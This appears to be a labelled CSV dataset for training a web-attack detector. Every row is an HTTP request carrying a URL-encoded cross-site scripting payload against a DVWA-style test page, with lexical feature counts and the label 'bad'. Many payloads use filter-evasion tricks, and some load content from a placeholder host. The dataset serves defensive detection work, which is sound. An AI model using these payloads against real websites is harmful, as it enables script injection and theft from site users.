method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
GET,/vulnerabilities/xss_r/?name=%3Ciframe++src%3Dj%26NewLine%3B%26Tab%3Ba%26NewLine%3B%26Tab%3B%26Tab%3Bv%26NewLine%3B%26Tab%3B%26Tab%3B%26Tab%3Ba%26NewLine%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3Bs%26NewLine%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3Bc%26NewLine%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3Br%26NewLine%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3Bi%26NewLine%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3Bp%26NewLine%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3Bt%26NewLine%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26colon%3Ba%26NewLine%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3Bl%26NewLine%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3Be%26NewLine%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3Br%26NewLine%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3Bt%26NewLine%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%2528%26NewLine%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B1%26NewLine%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%2529%3E%3C%2Fiframe%3E+%E2%80%8B,,0,0,0,0,3,1,bad
GET,/vulnerabilities/xss_r/?name=%22%2F%3E%3Cimg%2Fonerror%3D%250Cjavascript%3Aalert%281%29%250Csrc%3Dxxx%3Ax+%2F%3E,,0,1,0,1,1,5,bad
GET,/vulnerabilities/xss_r/?name=%3CHEAD%3E%3CMETA+HTTP-EQUIV%3D%22CONTENT-TYPE%22+CONTENT%3D%22text%2Fhtml%3B+charset%3DUTF-7%22%3E+%3C%2FHEAD%3E%2BADw-SCRIPT%2BAD4-alert%281%29%3B%2BADw-%2FSCRIPT%2BAD4-,,0,4,0,1,4,2,bad
GET,/vulnerabilities/xss_r/?name=%3CDIV+STYLE%3D%22width%3Aexpression%28javascript%3Aalert%281%29%29%3B%22%3E,,0,2,0,2,1,5,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg+src%3D%22x%3Aalert%22+onerror%3D%22eval%28src%252b%27%281%29%27%29%22%3E,,2,4,0,2,2,4,bad
GET,/vulnerabilities/xss_r/?name=%3C%21--%3Cimg+src%3Dxxx%3Ax+onerror%3Dalert%281%29%3E+--%3E,,0,0,2,1,3,3,bad
GET,/vulnerabilities/xss_r/?name=%3Chtml+onMouseEnter+html+onMouseEnter%3D%22javascript%3Aparent.javascript%3Aalert%281%29%22%3E%3C%2Fhtml+onMouseEnter%3E,,0,2,0,1,4,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cform+name%3Dself+location%3D%22javascript%3Aalert%281%29%22%3E%3C%2Fform%3E%3Cscript%3Eif%28top%21%3Dself%29%7B+top.location%3Dself.location%7D%3C%2Fscript%3E,,0,2,0,2,3,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cform+id%3D%22test%22%3E%3C%2Fform%3E%3Cbutton+form%3D%22test%22+formaction%3D%22javascript%3Aalert%281%29%22%3EX%3C%2Fbutton%3E,,0,6,0,1,3,4,bad
GET,/vulnerabilities/xss_r/?name=feed%3Adata%3Atext%2Fhtml%2C%253cscript%253ealert%25281%2529%253c%2Fscript%253e,,0,0,0,0,0,4,bad
GET,/vulnerabilities/xss_r/?name=%22%2F%3E%3Cimg%2Fonerror%3D%250Ajavascript%3Aalert%281%29%250Asrc%3Dxxx%3Ax+%2F%3E,,0,1,0,1,1,5,bad
GET,/vulnerabilities/xss_r/?name=%3C%2525+foo%3E%3Cx+foo%3D%22%2525%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E,,0,2,0,1,2,4,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg+src%2511%3Dx+onerror%3D%22javascript%3Aalert%281%29%22%3E,,0,2,0,1,2,5,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg+src%3D%22http%3A%2F%2FXXXxenotixXXX%3A3555%2Fxss_serve_payloads%2Fgif.gif%22+onerror%3Dalert%281%29%3E,,0,2,0,1,2,3,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg+src%3D%22x%3Agif%22+onerror%3D%22window%5B%27al%250065rt%27%5D%281%29%22%3E%3C%2Fimg%3E,,2,4,0,1,2,1,bad
GET,/vulnerabilities/xss_r/?name=%3Chead%3E%3Cbase+href%3D%22javascript%3A%2F%2F%22%3E%3C%2Fhead%3E%3Cbody%3E%3Ca+href%3D%22%2F.+%2F%2Cjavascript%3Aalert%281%29%2F%2F%23%22%3EKCF%3C%2Fa%3E%3C%2Fbody%3E,,0,4,0,1,3,8,bad
GET,/vulnerabilities/xss_r/?name=%3Cevent-source+src%3Djavascript%3Aalert%281%29%3E,,0,0,0,1,1,5,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg%2Fsrc%3D%221%22%2Fonerror%3D%22alert%281%29%22,,0,4,0,1,0,3,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg+src%3D%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B+%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2358%3B%26%2397%3B%26%23108%3B%26%23101%3B+%26%23114%3B%26%23116%3B%26%2340%3B%26%2339%3B%26%2388%3B%26%2383%3B%26%2383%3B%26%2339%3B%26%2341%3B%3E,,0,0,0,0,3,1,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg+src%3D1+onerror%3D%22alert%281%29%22%3E,,0,2,0,1,2,3,bad
GET,/vulnerabilities/xss_r/?name=%3C%3F+foo%3D%22%3E%3Cx+foo%3D%27%3F%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C%2Fscript%3E%27%3E%22%3E,,2,2,0,1,2,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cframeset+onload%3Djavascript%3Ajavascript%3Aalert%281%29%3E%3C%2Fframeset%3E,,0,0,0,1,1,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg+src%3D%23+onerror%253D%22javascript%3Aalert%281%29%22+%3E,,0,2,0,1,3,5,bad
GET,/vulnerabilities/xss_r/?name=%3Cdiv+style%3D%22width%3A+expression%28alert%281%29%3B%29%3B%22%3E,,0,2,0,2,2,3,bad
GET,/vulnerabilities/xss_r/?name=%3Cform%3E%3Ctextarea+%26%2313%3B+onkeyup%3D%27%250061%25006C%250065%250072%250074%26%23x28%3B1%26%23x29%3B%27%3E,,2,0,0,0,2,0,bad
GET,/vulnerabilities/xss_r/?name=%3Chead%3E%3Cbase+href%3D%22javascript%3A%2F%2F%22%2F%3E%3C%2Fhead%3E%3Cbody%3E%3Ca+href%3D%22%2F.+%2F%2Calert%281%29%2F%2F%23%22%3EXXX%3C%2Fa%3E%3C%2Fbody%3E,,0,4,0,1,3,6,bad
GET,/vulnerabilities/xss_r/?name=%3CIMG+DYNSRC%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E,,0,2,0,1,1,6,bad
GET,/vulnerabilities/xss_r/?name=%3C%21--%5Bif%3Cimg+src%3Dx+onerror%3Dalert%282%29%2F%2F%5D%3E+--%3E,,0,0,2,1,3,3,bad
GET,/vulnerabilities/xss_r/?name=%22%2F%3E%3Cimg%2Fonerror%3D%2520javascript%3Aalert%281%29%2520src%3Dxxx%3Ax+%2F%3E,,0,1,0,1,1,5,bad
GET,/vulnerabilities/xss_r/?name=%3C%3Fimport+namespace%3D%22t%22+implementation%3D%22%23default%23time2%22%3E,,0,4,0,0,2,0,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg%2510src%3Dx+onerror%3D%22javascript%3Aalert%281%29%22%3E,,0,2,0,1,1,5,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg+onerror%3DMsgBox%2B1+language%3Dvbs+src%3Da%3E,,0,0,0,0,3,1,bad
GET,/vulnerabilities/xss_r/?name=%3Ciframe+onload+iframe+onload%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C%2Fiframe+onload%3E,,0,2,0,1,4,6,bad
GET,/vulnerabilities/xss_r/?name=%60%22%27%3E%3Cimg+src%3Dxxx%3Ax+%2520onerror%3Djavascript%3Aalert%281%29%3E,,1,1,0,1,2,5,bad
GET,/vulnerabilities/xss_r/?name=%3CIMG+SRC%3D%22+%26%2314%3B++javascript%3Aalert%28%27KCF%27%29%3B%22%3E,,2,2,0,1,4,4,bad
GET,/vulnerabilities/xss_r/?name=%3Cform+id%3D%22test%22+%2F%3E%3Cbutton+form%3D%22test%22+formaction%3D%22javascript%3Aalert%281%29%22%3EX,,0,6,0,1,4,4,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg+src%3D%E2%80%9D%3Cimg+src%3Dx%E2%80%9D%2Fonerror%3Dalert%281%29%2F%2F%E2%80%9D%3E+Jquery%3A+%3Cimg%2Fsrc%2Fonerror%3Dalert%281%29%3E,,0,0,0,2,4,7,bad
GET,/vulnerabilities/xss_r/?name=%3CIMG+SRC%3D%22javascript%3Ajavascript%3Aalert%281%29%3B%22%3E,,0,2,0,1,1,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg%2511src%3Dx+onerror%3D%22javascript%3Aalert%281%29%22%3E,,0,2,0,1,1,5,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg+src%3Da+onerror%3Dalert%281%29%250A%3Ea,,0,0,0,1,2,3,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg+src%3Dxx%3Axx+onerror%3Dwindow%5B%5B%27alert%27%5D%5D%281%29%3E,,2,0,0,1,2,3,bad
GET,/vulnerabilities/xss_r/?name=%22%2F%3E%3Cimg%2Fonerror%3D%2522javascript%3Aalert%281%29%2522src%3Dxxx%3Ax+%2F%3E,,0,1,0,1,1,5,bad
GET,/vulnerabilities/xss_r/?name=%3CDIV+STYLE%3D%22width%3A+expression%28alert%281%29%29%3B%22%3E,,0,2,0,2,2,3,bad
GET,/vulnerabilities/xss_r/?name=%3C%21+foo%3D%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E,,0,2,0,1,1,4,bad
GET,/vulnerabilities/xss_r/?name=%3CIMG+SRC%3D%60javascript%3Aalert%28%E2%80%9CKCF+says%2C+%E2%80%98KCF%E2%80%99%E2%80%9D%29%60%3E,,0,0,0,1,3,4,bad
GET,/vulnerabilities/xss_r/?name=%3CIMG+SRC%3D%22javascript%3Aalert%28%27KCF%27%29%3B%22%3E,,2,2,0,1,1,4,bad
GET,/vulnerabilities/xss_r/?name=%3CIMG+SRC%3D%22javascript%3Ajavascript%3Aalert%281%29%22,,0,2,0,1,1,6,bad
GET,/vulnerabilities/xss_r/?name=%3C%2525+foo%3E%3Cx+foo%3D%22%2525%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C%2Fscript%3E%22%3E,,0,2,0,1,2,6,bad
GET,/vulnerabilities/xss_r/?name=%60%22%27%3E%3Cimg+src%3Dxxx%3Ax+onerror%250C%3Djavascript%3Aalert%281%29%3E,,1,1,0,1,2,5,bad
GET,/vulnerabilities/xss_r/?name=%3CIMG+SRC%3D%22javascript%3Aalert%28%27KCF%27%29%22,,2,2,0,1,1,4,bad
GET,/vulnerabilities/xss_r/?name=%3Ciframe%2F%2500%2F+src%3DjavaSCRIPT%26colon%3Balert%281%29,,0,0,0,1,1,3,bad
GET,/vulnerabilities/xss_r/?name=%3Cembed+src%3D%22data%3Atext%2Fhtml%3Bbase64%2C%2525%28base64%29s%22%3E,,0,2,0,1,1,1,bad
GET,/vulnerabilities/xss_r/?name=%3Ciframe+src%3Dhttp%3A%2F%2FXXXxenotixXXX%3A3555%2Fxss_serve_payloads%2Fkcf.html+%3C,,0,0,0,0,2,1,bad
GET,/vulnerabilities/xss_r/?name=http%3A%2F%2F%2522%2520onerror%3D%2522alert%25281%2529%3B%2F%2F,,0,0,0,0,0,2,bad
GET,/vulnerabilities/xss_r/?name=%20%3Cinput%20id=%271%27%3E%3Cinput%20id=1%3E%3Cscript%3Ealert(1)%3C/script%3E,,2,0,0,1,3,4,bad
GET,/vulnerabilities/xss_r/?name=htmlStr+%3D+%27%3Ca+href%3D%22javascript%3Aalert%281%29%22%3Ekcf%3C%2Fa%3E%27%3B+document.getElementById%28%27body%27%29.innerHTML+%3D+htmlStr%3B+try+%7B+alert%281%29%3B%7Dcatch%28e%29%7Balert%281%29%3B%7D%3B,,4,2,0,5,9,9,bad
GET,/vulnerabilities/xss_r/?name=%3Chtml+onMouseLeave+html+onMouseLeave%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C%2Fhtml+onMouseLeave%3E,,0,2,0,1,4,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg%2Fsrc%3D%40%26%2332%3B%26%2313%3B+onerror+%3D+prompt%28%27%26%2349%3B%27%29,,2,0,0,1,3,1,bad
GET,/vulnerabilities/xss_r/?name=%3C%2F+foo%3D%22%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C%2Fscript%3E%22%3E,,0,2,0,1,1,6,bad
GET,/vulnerabilities/xss_r/?name=%3Ciframe+src%3D%22javascript%3Aalert%281%29%3B+%3C,,0,1,0,1,2,5,bad
GET,/vulnerabilities/xss_r/?name=%3C%21--%5Bif+gte+IE+4%5D%3E%3CSCRIPT%3Ejavascript%3Aalert%281%29%3B%3C%2FSCRIPT%3E%3C%21%5Bendif%5D--%3E,,0,0,2,1,3,4,bad
GET,/vulnerabilities/xss_r/?name=%3CIMG+STYLE%3D%22kcf%3Aexpr%2F*KCF*%2Fession%28alert%281%29%29%22%3E,,0,2,0,2,1,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg%2Fanyjunk%2Fonerror%3Dalert%281%29+src%3Da%3E,,0,0,0,1,1,3,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg+src%3D%27xx%3Ax+onerror%3D%22alert%281%29%22%3E%27%3E,,2,2,0,1,2,3,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg+src%3D%22%22+onerror%3Dalert%281%29%3B%3E,,0,2,0,1,2,3,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg+src%3D%22%22+onerror%3Dalert%281%29%3E,,0,2,0,1,2,3,bad
GET,/vulnerabilities/xss_r/?name=%22%2F%3E%3Cimg%2Fonerror%3D%250Bjavascript%3Aalert%281%29%250Bsrc%3Dxxx%3Ax+%2F%3E,,0,1,0,1,1,5,bad
GET,/vulnerabilities/xss_r/?name=%3Ciframe%2Fsrc+%5C%2F%5C%2Fonload+%3D+prompt%281%29,,0,0,0,1,3,1,bad
GET,/vulnerabilities/xss_r/?name=%3Ciframe%2Fsrc%3D%22data%3Atext%2Fhtml%3B%26Tab%3Bbase64%26Tab%3B%2CPHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4%3D%22%3E,,0,2,0,0,0,1,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg+src%3Dxx%3Axx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,3,bad
GET,/vulnerabilities/xss_r/?name=%3Ciframe+%2500+src%3D%22%26Tab%3Bjavascript%3Aprompt%281%29%26Tab%3B%22%2500%3E,,0,2,0,1,2,3,bad
GET,/vulnerabilities/xss_r/?name=%3Ciframe+name%3Dx%3E%3C%2Fiframe%3E%22%3E%3C%2Fiframe%3E%3Ca+href%3D%22http%3A%2F%2FXXXxenotixXXX%3A3555%2Fxss_serve_payloads%2Fkcf.html%22+target%3Dx+id%3Dx%3E%3C%2Fa%3E%3Cscript%3Ewindow.onload%3Dfunction%28%29%7Bx.click%28%29%7D%3C%2Fscript%3E,,0,3,0,2,4,3,bad
GET,/vulnerabilities/xss_r/?name=%3CIMG+DYNSRC%3D%22javascript%3Aalert%281%29%22%3E,,0,2,0,1,1,4,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg+src%3D%27xx%3Ax%3E%3Cimg+src%3Dxx%3Ax+onerror%3Dalert%281%29%3E%27%3E,,2,0,0,1,3,4,bad
GET,/vulnerabilities/xss_r/?name=%3CIMG+DYNSRC%3D%22javascript%3Aalert%28%27KCF%27%29%22%3E,,2,2,0,1,1,4,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg+src%3D%27http%3A%2F%2FXXXxenotixXXX%3A3555%2Fxss_serve_payloads%2Fkcf.html%27+onload%3Dalert%281%29%2F%2F%3E%3C%2Fimg%3E,,2,0,0,1,2,3,bad
GET,/vulnerabilities/xss_r/?name=%3CIMG+SRC%3D%26%230000106%26%230000097%26%230000118%26%230000097%26%230000115%26%230000099%26%230000114%26%230000105%26%230000112%26%230000116%26%230000058%26%230000097%26%230000108%26%230000101%26%230000114%26%230000116%26%230000040%26%230000039%26%230000088%26%230000083%26%230000083%26%230000039%26%230000041%3E,,0,0,0,0,1,0,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg+src%3Da+onerror%3Dalert%281%29+%250A%3E,,0,0,0,1,3,3,bad
GET,/vulnerabilities/xss_r/?name=%3Cform+id%3Dtest+onforminput%3Dprompt%281%29%3E%3Cinput%3E%3C%2Fform%3E%3Cbutton+form%3Dtest+onformchange%3Dprompt%282%29%3EX%3C%2Fbutton%3E,,0,0,0,2,4,0,bad
GET,/vulnerabilities/xss_r/?name=%3Cembed+code%3D%2525%28scriptlet%29s%3E%3C%2Fembed%3E,,0,0,0,1,1,1,bad
GET,/vulnerabilities/xss_r/?name=%22%2F%3E%3Cimg%2Fonerror%3D%2509javascript%3Aalert%281%29%2509src%3Dxxx%3Ax+%2F%3E,,0,1,0,1,1,5,bad
GET,/vulnerabilities/xss_r/?name=%3Ciframe+srcdoc%3D%27%3Cbody+onload%3Dprompt%26lpar%3B1%26rpar%3B%3E%27%3E,,2,0,0,0,2,1,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg+src%3D%22blah%22onmouseover%3D%22alert%281%29%3B%22%3E,,0,4,0,1,1,3,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg+src%3D%60%2500%60%26NewLine%3B+onerror%3Dalert%281%29%26NewLine%3B,,0,0,0,1,2,3,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg+src%3D%22http%3A%2F%2FXXXxenotixXXX%3A3555%2Fxss_serve_payloads%2Fimage.png%22+onerror%3Dalert%281%29%3E,,0,2,0,1,2,3,bad
GET,/vulnerabilities/xss_r/?name=%3C%3F+foo%3D%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E,,0,2,0,1,1,4,bad
GET,/vulnerabilities/xss_r/?name=%3Ciframe+onreadystatechange%3Dalert%281%29%3E,,0,0,0,1,1,2,bad
GET,/vulnerabilities/xss_r/?name=%3CIMG+SRC%3Djavascript%3Aalert%281%29%3E,,0,0,0,1,1,4,bad
GET,/vulnerabilities/xss_r/?name=%3Ciframe+src+iframe+src%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C%2Fiframe+src%3E,,0,2,0,1,4,9,bad
GET,/vulnerabilities/xss_r/?name=%3Cform+name%3Dself+location%3D%22javascript%26%2358%3Balert%281%29%22%3E%3C%2Fform%3E%3Cscript%3Eif%28top%21%3Dself%29%7B+top.location%3Dself.location%7D%3C%2Fscript%3E,,0,2,0,2,3,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg+src%3D%2F+onerror%3Dalert%281%29%3B%3E,,0,0,0,1,2,3,bad
GET,/vulnerabilities/xss_r/?name=%3CIMG+SRC%3D%22+%26%2314%3B++javascript%3Aalert%281%29%3B%22%3E,,0,2,0,1,4,4,bad
GET,/vulnerabilities/xss_r/?name=%3Ciframe++src%3Dj%26Tab%3Ba%26Tab%3Bv%26Tab%3Ba%26Tab%3Bs%26Tab%3Bc%26Tab%3Br%26Tab%3Bi%26Tab%3Bp%26Tab%3Bt%26Tab%3B%3Aa%26Tab%3Bl%26Tab%3Be%26Tab%3Br%26Tab%3Bt%26Tab%3B%2528%26Tab%3B1%26Tab%3B%2529%3E%3C%2Fiframe%3E,,0,0,0,0,2,1,bad
GET,/vulnerabilities/xss_r/?name=%3C%21+foo%3D%22%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C%2Fscript%3E%22%3E,,0,2,0,1,1,6,bad
GET,/vulnerabilities/xss_r/?name=,,0,0,0,0,0,0,bad
GET,/vulnerabilities/xss_r/?name=%3CDIV+STYLE%3D%22width%3A+expression%28alert%28%27KCF%27%29%29%3B%22%3E,,2,2,0,2,2,3,bad
GET,/vulnerabilities/xss_r/?name=--%3E%3C%21--+---%3E+%3Cimg+src%3Dxxx%3Ax+onerror%3Djavascript%3Aalert%281%29%3E+--%3E,,0,0,4,1,5,5,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg+onerror%3D%E2%80%9Dalert%281%29%E2%80%9Dsrc%3Da%3E,,0,0,0,1,1,3,bad
GET,/vulnerabilities/xss_r/?name=%60%22%27%3E%3Cimg+src%3Dxxx%3Ax+onerror%250A%3Djavascript%3Aalert%281%29%3E,,1,1,0,1,2,5,bad
GET,/vulnerabilities/xss_r/?name=%3C%2Ffont%3E%2F%3Csvg%3E%3Cstyle%3E%7Bsrc%26%23x3A%3B%27%3Cstyle%2Fonload%3Dthis.onload%3Dconfirm%281%29%3E%27%3C%2Ffont%3E%2F%3C%2Fstyle%3E,,2,0,0,1,0,1,bad
GET,/vulnerabilities/xss_r/?name=%3CIMG+SRC%3D%22javascript%3Aalert%281%29%22,,0,2,0,1,1,4,bad
GET,/vulnerabilities/xss_r/?name=%3Cembed+src%3D%22javascript%3Aalert%281%29%22%3E,,0,2,0,1,1,5,bad
GET,/vulnerabilities/xss_r/?name=%3Cform%3E%3Ca+href%3D%22javascript%3A%250061lert%26%23x28%3B1%26%23x29%3B%22%3EX,,0,2,0,0,1,3,bad
GET,/vulnerabilities/xss_r/?name=%3C%21--+%60%3Cimg%2Fsrc%3Dxx%3Axx+onerror%3Dalert%281%29%2F%2F--%21%3E,,0,0,2,1,2,3,bad
GET,/vulnerabilities/xss_r/?name=%3CIMG+SRC%3DJaVaScRiPt%3Aalert%28%27KCF%27%29%3E,,2,0,0,1,1,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cframeset+onload%3Dprompt%281%29%3E,,0,0,0,1,1,0,bad
GET,/vulnerabilities/xss_r/?name=%3C%21ENTITY+x+%22%26%23x3C%3Bhtml%3Aimg%26%23x20%3Bsrc%3D%27x%27%26%23x20%3Bxmlns%3Ahtml%3D%27http%3A%2F%2Fwww.w3.org%2F1999%2Fxhtml%27%26%23x20%3Bonerror%3D%27alert%281%29%27%2F%26%23x3E%3B%22%3E,,6,2,0,1,2,3,bad
GET,/vulnerabilities/xss_r/?name=%3Cinput+autofocus+onfocus%3Dalert%281%29%3E,,0,0,0,1,2,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg+src%3Dxx%3Axx+alt%3D%60%2Fonerror%3Dalert%281%29%2F%2F%60%3E,,0,0,0,1,2,3,bad
GET,/vulnerabilities/xss_r/?name=%60%22%27%3E%3Cimg+src%3Dxxx%3Ax+%2509onerror%3Djavascript%3Aalert%281%29%3E,,1,1,0,1,2,5,bad
GET,/vulnerabilities/xss_r/?name=%3CEMBED+SRC%3D%22data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4%3D%22+type%3D%22image%2Fsvg%2Bxml%22+AllowScriptAccess%3D%22always%22%3E%3C%2FEMBED%3E,,0,6,0,0,3,0,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg+src%3Dx+onerror%3D%2511%22javascript%3Aalert%281%29%22%3E,,0,2,0,1,2,5,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg+src%3Dx+onerror%3D%2512%22javascript%3Aalert%281%29%22%3E,,0,2,0,1,2,5,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg%2547src%3Dx+onerror%3D%22javascript%3Aalert%281%29%22%3E,,0,2,0,1,1,5,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg+src%3Dxx%3Axx+onerror%3D%22x%3D%27%5C%27%2Calert%281%29%2F%2F%27%22%3E,,3,2,0,1,2,3,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg+src%3Dx+onError%3D%22javascript%3Aalert%281%29%22%2F%3E,,0,2,0,1,2,5,bad
GET,/vulnerabilities/xss_r/?name=%60%22%27%3E%3Cimg+src%3Dxxx%3Ax+onerror%2500%3Djavascript%3Aalert%281%29%3E,,1,1,0,1,2,5,bad
GET,/vulnerabilities/xss_r/?name=%3CIMG+%22%22%22%3E%3CSCRIPT%3Ealert%281%29%3C%2FSCRIPT%3E%22%3E,,0,4,0,1,1,2,bad
GET,/vulnerabilities/xss_r/?name=%3CIMG+SRC%3D%60javascript%3Aalert%28%22KCF+says%2C+%27KCF%27%22%29%60%3E,,2,2,0,1,3,4,bad
GET,/vulnerabilities/xss_r/?name=%3CIMG+SRC%3Djavascript%3Aalert%28%26quot%3BKCF%26quot%3B%29%3E,,0,0,0,1,1,6,bad
GET,/vulnerabilities/xss_r/?name=%3CIMG+SRC%3DJaVaScRiPt%3Aalert%281%29%3E,,0,0,0,1,1,2,bad
GET,/vulnerabilities/xss_r/?name=%3Chtml+onMouseMove+html+onMouseMove%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C%2Fhtml+onMouseMove%3E,,0,2,0,1,4,6,bad
GET,/vulnerabilities/xss_r/?name=%23%3Fgad%3Dxxxx%22onload%3D%22alert%281%29%22,,0,3,0,1,0,2,bad
GET,/vulnerabilities/xss_r/?name=exp%2F*%3CA+STYLE%3D%27no%5Ckcf%3Anokcf%28%22*%2F%2F*%22%29%3Bkcf%3A%26%23101%3Bx%26%23x2F%3B*KCF*%2F%2F*%2F*%2Fpression%28alert%281%29%29%27%3E,,2,2,0,3,1,2,bad
GET,/vulnerabilities/xss_r/?name=%3CIMG+ONERROR%3D%E2%80%9DVBS%3AMSGBOX+1%E2%80%9D+SRC%3DA%3E,,0,0,0,0,3,0,bad
